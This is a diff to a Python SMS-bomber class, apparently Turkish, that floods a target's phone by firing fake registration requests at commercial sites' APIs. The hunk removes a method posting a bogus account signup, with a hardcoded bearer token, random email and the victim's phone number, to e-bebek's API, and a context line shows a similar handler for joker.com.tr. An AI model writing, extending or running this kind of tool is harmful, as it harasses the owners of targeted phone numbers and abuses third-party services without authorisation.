@@ -760,18 +760,3 @@ class SendSms():
         except:
             print(f"{Fore.LIGHTRED_EX}『 NO 』 {Style.RESET_ALL}hata ⇝ joker.com.tr")
 
-
-    #e-bebek.com
-    def Ebebek(self):
-        try:
-            url = "https://api2.e-bebek.com:443/ebebekwebservices/v2/ebebek/users/anonymous/validate?curr=TRY&lang=tr"
-            headers = {"Content-Type": "application/json", "Authorization": "Bearer rTeVaZRkRwHPdroX6JDN3uLtjRM"}
-            json={"email": f"{self.random_mail}@gmail.com", "emailAllow": False, "firstName": "Memati", "lastName": "Bas", "password": "31ABC..abc31", "smsAllow": True, "uid": self.phone}
-            r = requests.post(url, headers=headers, json=json)
-            if r.json()["status"] == "SUCCESS":
-                print(f"{Fore.LIGHTGREEN_EX}『 YES 』 {Style.RESET_ALL}gönderildi ⇝ api2.e-bebek.com")
-                self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}『 NO 』 {Style.RESET_ALL}hata ⇝ api2.e-bebek.com")
